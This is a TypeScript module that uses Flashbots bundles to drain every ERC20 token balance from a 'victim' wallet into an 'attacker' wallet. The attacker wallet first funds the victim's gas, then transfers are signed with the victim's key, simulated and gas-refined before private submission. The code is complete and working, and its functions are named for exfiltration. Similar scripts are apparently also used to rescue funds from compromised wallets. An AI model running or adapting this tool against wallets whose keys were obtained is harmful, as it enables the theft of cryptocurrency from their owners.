import {createAlchemyWeb3} from '@alch/alchemy-web3';
import {FlashbotsBundleProvider} from '@flashbots/ethers-provider-bundle';
import * as fs from 'fs';
import {parse} from 'dotenv';
import {
  Contract,
  JsonRpcProvider,
  Provider,
  Signer,
  Wallet,
} from 'ethers';
import {klona} from 'klona';

import {
  Address,
  ParsedEnvironment,
  Transaction,
} from '../@types';

const WAD = BigInt('1000000000000000000');

const nonEmptyStringOrThrow = (src: Record<string, unknown>, key: string): string => {
  const {[key]: value} = src;
  if (typeof value !== 'string' || !value.length)
    throw new Error(
      `expected non-empty string "${key}", encountered ${value}`
    );
  return value;
}

export const getEnvironment = async (): Promise<ParsedEnvironment> => {
  const isTest = process.env.NODE_ENV === 'test';
  const parsed = parse(
    fs.readFileSync(`.env${isTest ? '.test' : ''}`, 'utf-8')
  );
  const alchemyRpcUri = nonEmptyStringOrThrow(parsed, 'ALCHEMY_URI');
  const provider = new JsonRpcProvider(alchemyRpcUri);
  const authSigner = Wallet.createRandom();
  return {
    attackerWallet: getWalletOrThrow({
      entropy: nonEmptyStringOrThrow(parsed, 'ATTACKER_WALLET'),
      provider,
    }),
    isTest,
    web3: createAlchemyWeb3(alchemyRpcUri),
    provider,
    flashbotsProvider: await FlashbotsBundleProvider.create(provider, authSigner),
    chainId: 1,
    type: 2,
  };
};

export const getWalletOrThrow = ({
  entropy,
  provider = undefined,
}: {
  readonly entropy: string;
  readonly provider?: Provider;
}): Signer => {
  try {
    return Wallet.fromPhrase(entropy, provider);
  } catch (e) {
    return new Wallet(entropy, provider);
  }
};

export const createExfiltrateTransactions = async ({
  to,
  victimWallet,
  maxBaseFeeInFutureBlock,
  maxPriorityFeePerGas,
}: {
  readonly to: `0x${string}`
  readonly victimWallet: Signer;
  readonly maxPriorityFeePerGas: bigint;
  readonly maxBaseFeeInFutureBlock: bigint;
}) => {
  const [{web3, provider, chainId, type}, victimAddress] = await Promise.all([
    getEnvironment(),
    getSignerAddress(victimWallet),
  ]);
  const [{tokenBalances}, victimNonce] = await Promise.all([
    web3.alchemy.getTokenBalances(
      victimAddress,
      // @ts-ignore
      'erc20'
    ),
    provider.getTransactionCount(victimAddress),
  ]);
  return Promise.all(
    tokenBalances
      .filter(({ tokenBalance }) => BigInt(tokenBalance || '0') > 0)
      .map(
        async ({ tokenBalance, contractAddress }, i): Promise<Transaction> => {
          const erc20 = new Contract(
            contractAddress,
            ['function transfer(address to, uint amount) returns (bool)'],
            victimWallet
          );

          const gasLimit = await erc20.transfer!.estimateGas(to, tokenBalance);
          const {data} = await erc20.transfer!.populateTransaction(to, tokenBalance);
          return {
            to: contractAddress as Address,
            data,
            chainId,
            maxFeePerGas: maxPriorityFeePerGas + maxBaseFeeInFutureBlock,
            maxPriorityFeePerGas: maxPriorityFeePerGas,
            from: victimAddress,
            nonce: victimNonce + i,
            type,
            gasLimit,
            value: BigInt(0),
          };
        },
      )
  );
};

export const getSignerAddress = (signer: Signer): Promise<Address> =>
  signer.getAddress().then(address => address as Address);

export const findSignerByAddressOrThrow = async ({
  address,
  signers,
}: {
  readonly address: Address;
  readonly signers: readonly Signer[];
}): Promise<Signer> => {
  const [matchingSigner] = (
    await Promise.all(
      signers.map(async (signer: Signer) => {
        const signerAddress = await getSignerAddress(signer);
        if (signerAddress.toLowerCase() !== address.toLowerCase()) return null;
        return signer;
      })
    )
  )
    .filter(Boolean);

  if (!matchingSigner) throw new Error(`unable to find signer for ${address}`);

  return matchingSigner;
};

export const generateFlashbotsSignedTransactionsBundle = async ({
  attackerWallet,
  preTransactionBundle,
  victimWallet,
}: {
  readonly attackerWallet: Signer;
  readonly victimWallet: Signer;
  readonly preTransactionBundle: readonly Transaction[];
}) => {
  return await Promise.all(
    preTransactionBundle.map(async (tx) => {
      const {from} = tx;
      const signer = await findSignerByAddressOrThrow({
        address: from,
        signers: [attackerWallet, victimWallet],
      });
      return {
        signedTransaction: await signer.signTransaction(tx),
      };
    })
  );
};

export const getSimultionResponseOrThrow = async ({
  flashbotsProvider,
  targetBlockNumber,
  signedTransactions,
}: {
  readonly flashbotsProvider: FlashbotsBundleProvider;
  readonly targetBlockNumber: number;
  readonly signedTransactions: readonly string[]; 
}) => {
  const simulationResponse = (
    await flashbotsProvider.simulate([...signedTransactions], targetBlockNumber)
  );

  if ('error' in simulationResponse) {
    const { code, message } = simulationResponse.error;
    throw new Error(`Flashbots: ${message} (${code})`);
  }

  return simulationResponse;
};

export const refinePreTransactionBundle = async({
  attackerWallet,
  flashbotsProvider,
  victimWallet,
  preTransactionBundle,
  targetBlockNumber,
  maxBaseFeeInFutureBlock,
  maxPriorityFeePerGas,
  victimGasLimitBump = BigInt('1200000000000000000'), // +10%
}: {
  readonly attackerWallet: Signer;
  readonly flashbotsProvider: FlashbotsBundleProvider;
  readonly victimWallet: Signer;
  readonly preTransactionBundle: readonly Transaction[];
  readonly targetBlockNumber: number;
  readonly maxBaseFeeInFutureBlock: bigint;
  readonly maxPriorityFeePerGas: bigint;
  readonly victimGasLimitBump?: bigint;
}): Promise<readonly Transaction[]> => {
  const signedTransactionsBundle = await generateFlashbotsSignedTransactionsBundle({
    attackerWallet,
    preTransactionBundle: klona(preTransactionBundle),
    victimWallet,
  });

  const signedTransactions = await flashbotsProvider.signBundle(signedTransactionsBundle);

  const simulationResponse = await getSimultionResponseOrThrow({
    signedTransactions,
    flashbotsProvider,
    targetBlockNumber,
  });

  const preTransactionsWithRefinedGasLimits = preTransactionBundle.map(
    (preTransaction: Transaction, i: number) => {

      if (i === 0) return preTransaction /* ignore_attacker */;

      const bundleResultTransaction = simulationResponse.results[i]!;
      return {
        ...preTransaction,
        gasLimit: (BigInt(bundleResultTransaction.gasUsed) * victimGasLimitBump) / WAD
      };
    },
  );

  const victimWalletGasLimit = preTransactionsWithRefinedGasLimits
    .filter((_, i) => i > 0)
    .reduce((e, {gasLimit}) => e + gasLimit, BigInt(0));

  const [attackerTransaction, ...victimTransactions] = preTransactionsWithRefinedGasLimits;
  return [
    {
      ...attackerTransaction!,
      value: calculateGasCost({
        gasLimit: victimWalletGasLimit,
        maxBaseFeeInFutureBlock,
        maxPriorityFeePerGas,
      }),
    },
    ...victimTransactions
  ];
};

export const calculateGasCost = ({
  gasLimit,
  maxBaseFeeInFutureBlock,
  maxPriorityFeePerGas,
}: {
  readonly gasLimit: bigint;
  readonly maxBaseFeeInFutureBlock: bigint;
  readonly maxPriorityFeePerGas: bigint;
}) => gasLimit * (maxBaseFeeInFutureBlock + maxPriorityFeePerGas);

export const createExfiltrateBundle = async ({
  victimWallet,
  blocksInFuture = 1,
  simulateRefinedBlock = false,
}: {
  readonly victimWallet: Signer;
  readonly blocksInFuture?: number;
  readonly simulateRefinedBlock?: boolean;
}) => {
  const {attackerWallet, provider, flashbotsProvider, chainId, type} = await getEnvironment();
  const [attackerAddress, victimAddress, latestBlock, feeData] = await Promise.all([
    getSignerAddress(attackerWallet),
    getSignerAddress(victimWallet),
    provider.getBlock('latest'),
    provider.getFeeData(),
  ]);

  if (!latestBlock) throw new Error('failed to determine latest block');

  const targetBlockNumber = latestBlock!.number + blocksInFuture;

  const latestBlockBaseFeePerGas = latestBlock?.baseFeePerGas;

  if (!latestBlockBaseFeePerGas) throw new Error('failed to determine baseFee');

  const maxBaseFeeInFutureBlock = FlashbotsBundleProvider.getMaxBaseFeeInFutureBlock(
    latestBlockBaseFeePerGas,
    blocksInFuture
  );

  const maxPriorityFeePerGas = feeData.maxPriorityFeePerGas;

  if (!maxPriorityFeePerGas) throw new Error(`failed to determine maxPriorityFeePerGas`);

  const attackerNonce = await provider.getTransactionCount(attackerAddress);

  const exfiltrateTransactions = await createExfiltrateTransactions({
    to: attackerAddress as `0x${string}`,
    victimWallet,
    maxBaseFeeInFutureBlock,
    maxPriorityFeePerGas: maxPriorityFeePerGas!,
  });

  const victimGasLimit = exfiltrateTransactions.reduce(
    (e, {gasLimit}) => e + gasLimit,
    BigInt('0'),
  );

  const exfiltrateTransactionsGasCost = calculateGasCost({
    gasLimit: victimGasLimit,
    maxBaseFeeInFutureBlock,
    maxPriorityFeePerGas,
  });

  const gasRefillTransaction: Transaction = {
    to: victimAddress,
    chainId,
    maxFeePerGas: maxPriorityFeePerGas + maxBaseFeeInFutureBlock,
    maxPriorityFeePerGas: maxPriorityFeePerGas,
    value: exfiltrateTransactionsGasCost,
    nonce: attackerNonce,
    from: attackerAddress,
    gasLimit: 21000n,
    type,
  };

  const preTransactionBundle = [gasRefillTransaction, ...exfiltrateTransactions];

  console.log('preTransactionBundle', preTransactionBundle);

  const refinedPreTransactionBundle = await refinePreTransactionBundle({
    attackerWallet,
    flashbotsProvider,
    victimWallet,
    preTransactionBundle,
    targetBlockNumber,
    maxBaseFeeInFutureBlock,
    maxPriorityFeePerGas,
  });

  console.log('refinedPreTransactionBundle', refinedPreTransactionBundle);

  const signedTransactionsBundle = await generateFlashbotsSignedTransactionsBundle({
    attackerWallet,
    preTransactionBundle: refinedPreTransactionBundle,
    victimWallet,
  });

  if (simulateRefinedBlock) {
    const signedTransactions = await flashbotsProvider.signBundle(signedTransactionsBundle);
    const refinedBlockSimulation = await getSimultionResponseOrThrow({
      signedTransactions, flashbotsProvider, targetBlockNumber
    });
    console.log('refinedBlockSimulation', refinedBlockSimulation);
  }

  return [signedTransactionsBundle, blocksInFuture] as const;
};
